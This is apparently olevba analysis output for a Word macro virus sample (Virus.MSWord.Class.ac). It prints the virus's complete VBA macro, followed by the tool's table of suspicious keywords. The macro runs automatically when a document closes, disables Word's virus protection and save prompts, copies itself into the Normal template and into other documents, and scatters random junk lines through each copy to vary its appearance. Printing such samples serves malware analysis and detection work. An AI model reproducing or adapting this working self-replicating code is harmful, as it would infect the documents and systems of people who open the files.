olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ac-2ed80fcd6a80ac79ab906ae80599b984b410dd9d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ac-2ed80fcd6a80ac79ab906ae80599b984b410dd9d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
Options.ConfirmConversions = 0
UIL = QBN + KGN
PS16 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
OFG = SSM + VUE
Options.SaveNormalPrompt = 0
PVF = LCV + OAM
Options.VirusProtection = 0
CCR = GBG + IGU
DG5 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
VIG = DDO + JJP
Application.EnableCancelKey = 0
HNE = EMB + KTF
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
RIG = UNN + JCM
Set EI66 = ActiveDocument.VBProject.VBComponents.Item(1)
PUS = ALU + JOL
CP86 = True
LKH = IFB + FVB
End If
IIK = DKF + NLD
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
UOL = ICR + KQN
Set EI66 = NormalTemplate.VBProject.VBComponents.Item(1)
SAE = BCH + CAL
UM91 = True
OLS = BEO + JHD
End If
PUL = BQI + KKE
If UM91 = True Then
HCM = DUC + JGT
ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\" & Application.UserInitials
QGO = FBA + HRG
EI66.CodeModule.AddFromFile ("c:\" & Application.UserInitials)
FKF = HAK + ETM
EI66.CodeModule.deletelines 1, 4
QUH = LBN + JVC
EI66.CodeModule.replaceline 1, "Sub AutoClose()"
UNH = DKE + VCA
ElseIf CP86 = True Then
HMU = LIS + SOP
EI66.CodeModule.AddFromFile ("c:\" & Application.UserInitials)
VHK = JPD + JLR
EI66.CodeModule.deletelines 1, 4
LJL = FNK + OTI
End If
GGD = LEM + HTK
With EI66.CodeModule
EPQ = NRD + REV
For x = 2 To (EI66.CodeModule.CountOfLines - 1) Step 2
BBR = IKC + CDB
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
PLM = EKQ + QIT
Next x
QBN = PAJ + IGV
End With
RPJ = QGH + JUC
EH42:
OHC = EBJ + VLK
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
